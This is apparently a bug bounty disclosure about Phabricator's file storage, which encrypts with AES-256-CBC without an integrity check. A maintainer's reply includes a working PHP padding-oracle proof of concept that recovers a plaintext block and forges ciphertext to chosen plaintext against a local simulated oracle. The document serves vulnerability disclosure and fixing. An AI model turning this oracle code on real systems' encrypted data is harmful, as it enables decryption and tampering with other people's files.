vulnerability_information:
Dear Phabricator bug bounty team,

# Summary
---

Phabricator encrypts data with AES in CBC mode, but does not ensure integrity of the encrypted data. You must authenticate the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.

# Why does this vulnerability exist?
---

`src/applications/files/format/PhabricatorFileAES256StorageFormat.php` encrypts the data as follows without checking the integrity of the message:

~~~
private function encryptData(
    $data,
    PhutilOpaqueEnvelope $key,
    PhutilOpaqueEnvelope $iv) {
    $method = 'aes-256-cbc';
    $key = $key->openEnvelope();
    $iv = $iv->openEnvelope();
    $result = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);
    if ($result === false) {
      throw new Exception(
        pht(
          'Failed to openssl_encrypt() data: %s',
          openssl_error_string()));
    }
    return $result;
}
~~~

Link to source code: https://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php

# How can this be exploited?
---

By not ensuring integrity Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.

# How can this be fixed?
---

As stated previously, you must check the integrity of the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.

Best regards,
Ed

activities.message:
After fiddling for an hour or two I was able to actually poison ciphertext in practice, which convinces me that this attack is viable in CBC mode. This is not the world's cleanest proof-of-concept, but the shape of the attack is as described above:

  - We use the oracle to discover the plaintext in the second block (in Phabricator, this is not necessary because you can read the plaintext if you can query the oracle, but an oracle plus the ciphertext is sufficient in the general case).
  - We use the oracle and the discovered plaintext to poison the second block so it decrypts to chosen plaintext.
  - Although this script doesn't demonstrate it, I believe we can continue working backward to poison an arbitrarily long suffix of the file (but not the entire file).
  - We end up with one block of garbage which we can not control before any sections we poison, but it's reasonable that this may be acceptable (the ownCloud example is illustrative). I think getting rid of this garbage block is legitimately hard (you really have to search the whole space) but attackers can just build attacks where this doesn't matter.
  - In the worst case, we only need ~4,000 queries to the oracle per 16-byte block, which is a realistic number of queries to execute even against a network oracle to meaningfully poison a file.

I think there are still a lot of barriers to overcome, but this was the biggest one by a wide margin. We'll pursue a fix for this in the short term. Since this involves a migration and there's some adjacent work in Files I'm not sure I'll get it done in time for the weekly release (in about 30 hours from now), but I'm going to try to make it if nothing else catches on fire between now and then.

(I think AWS employees without accounts still can't mount this attack since they can't query the oracle.)

```php
<?php

define('CIPHER', 'aes-256-cbc');

$plaintext =
  "AAAAAAAAAAAAAAAA".
  "BBBBBBBBBBBBBBBB".
  "CCCCCCCCCCCC";

$key = get_random_bytes(32);
$iv = get_random_bytes(16);

print_section('PLAINTEXT', $plaintext);
print_section('KEY', $key, true);
print_section('IV', $iv, true);

$ciphertext = openssl_encrypt($plaintext, CIPHER, $key, OPENSSL_RAW_DATA, $iv);
if ($ciphertext === false) {
  die('Failed to encrypt plaintext.');
}

print_section('CIPHERTEXT', $ciphertext, true);

$oracle = array(
  'key' => $key,
  'iv' => $iv,
);

oracle_decrypt_attack($ciphertext, $oracle);
oracle_encrypt_attack($ciphertext, $plaintext, $oracle, 'ZZZZZZZZZZZZZZZZ');


function oracle_decrypt_attack($ciphertext, $oracle) {
  $blocks = str_split($ciphertext, 16);

  // We're going to fiddle with the first block to find bytes in the second
  // block.
  $head_block = $blocks[0];
  $tail_block = $blocks[1];

  $solved_block = oracle_decrypt_attack_block(
    $head_block,
    $tail_block,
    $oracle);

  print_section('ORACLE DECYPT', $solved_block);
}

function oracle_encrypt_attack($ciphertext, $plaintext, $oracle, $evil_plain) {
  $blocks = str_split($ciphertext, 16);
  $head_block = $blocks[0];
  $tail_block = $blocks[1];

  $plain_blocks = str_split($plaintext, 16);
  $head_plain = $plain_blocks[0];
  $tail_plain = $plain_blocks[1];

  $solved_block = oracle_encrypt_attack_block(
    $head_block,
    $tail_block,
    $oracle,
    $tail_plain,
    $evil_plain);

  print_section('ORACLE INPUT', $head_block, true);
  print_section('ORACLE ENCRYPT', $solved_block, true);

  // Now, construct the attack text.
  $full_attack = $blocks;
  $full_attack[0] = $solved_block;
  $full_attack = implode('', $full_attack);

  $key = $oracle['key'];
  $iv = $oracle['iv'];
  $result = openssl_decrypt($full_attack, CIPHER, $key, OPENSSL_RAW_DATA, $iv);
  print_section('ORACLE ATTACK (RAW)', $result);
  print_section('ORACLE ATTACK (BYTES)', $result, true);
}

function oracle_decrypt_attack_block(
  $head_block,
  $tail_block,
  $oracle) {

  echo "Performing oracle decryption attack against target block...\n";

  $plaintext = array_fill(0, 16, 0);
  for ($byte = 15; $byte >= 0; $byte--) {
    $raw_value = ord($head_block[$byte]);
    $pad_value = (16 - $byte);

    $try_head = $head_block;

    // If we've already guessed some plaintext bytes, first configure the
    // end of the block to have the right values for those bytes.
    for ($ii = 15; $ii > $byte; $ii--) {
      $attack_value = ord($head_block[$ii]) ^ $plaintext[$ii] ^ $pad_value;
      $try_head[$ii] = chr($attack_value);
    }

    // Now, guess the last byte, using the padding oracle to verify the value
    // for the plaintext.
    for ($guess_byte = 0; $guess_byte <= 255; $guess_byte++) {
      $try_head[$byte] = chr($raw_value ^ $guess_byte ^ $pad_value);

      $ok = query_oracle($try_head.$tail_block, $oracle);
      if ($ok) {
        printf(
          "Solved byte %d.\n",
          $byte);
        $plaintext[$byte] = $guess_byte;
        break;
      }
    }
  }

  echo "\n";

  // Convert the plaintext back to a string and return it.
  $result = '';
  foreach ($plaintext as $ord) {
    $result .= chr($ord);
  }

  return $result;
}

function oracle_encrypt_attack_block(
  $head_block,
  $tail_block,
  $oracle,
  $plain_block,
  $evil_block) {

  echo "Performing oracle encryption attack against target block...\n";

  $ciphertext = array_fill(0, 16, 0);
  for ($byte = 15; $byte >= 0; $byte--) {
    $raw_value = ord($head_block[$byte]);
    $pad_value = (16 - $byte);

    $try_head = $head_block;

    $known_value = ord($plain_block[$byte]);
    $evil_value = ord($evil_block[$byte]);

    for ($ii = 15; $ii > $byte; $ii--) {
      $attack_value =
        ord($head_block[$ii]) ^
        ord($plain_block[$ii]) ^
        $pad_value;

      $try_head[$ii] = chr($attack_value);
    }

    $solved = false;
    for ($guess_byte = 0; $guess_byte <= 255; $guess_byte++) {
      $guess_value =
        $raw_value ^
        $guess_byte ^
        $pad_value ^
        $known_value ^
        $evil_value;

      $try_head[$byte] = chr($guess_value);

      $ok = query_oracle($try_head.$tail_block, $oracle);
      if ($ok) {
        $solved = true;
        printf(
          "Solved byte %d.\n",
          $byte);

        $ciphertext[$byte] = ord($try_head[$byte]) ^ $pad_value ^ $evil_value;

        break;
      }
    }

    if (!$solved) {
      die("Unable to solve byte {$byte}.\n");
    }
  }

  echo "\n";

  // Convert the plaintext back to a string and return it.
  $result = '';
  foreach ($ciphertext as $ord) {
    $result .= chr($ord);
  }

  return $result;
}

function query_oracle($guess, $oracle) {
  $key = $oracle['key'];
  $iv = $oracle['iv'];
  $ok = openssl_decrypt($guess, CIPHER, $key, OPENSSL_RAW_DATA, $iv);

  return ($ok !== false);
}

function get_random_bytes($length) {
  $src = fopen('/dev/urandom', 'rb');
  if ($src === false) {
    die('Failed to open /dev/urandom.');
  }

  $result = fread($src, $length);
  if ($result === false) {
    die('Failed to read /dev/urandom.');
  }

  fclose($src);

  return $result;
}

function print_section($header, $body, $binary = false) {
  echo $header;
  echo "\n";
  if ($binary) {
    for ($ii = 0; $ii < strlen($body); $ii++) {
      printf('0x%02x ', ord($body[$ii]));
    }
  } else {
    echo $body;
  }
  echo "\n\n";
}
```
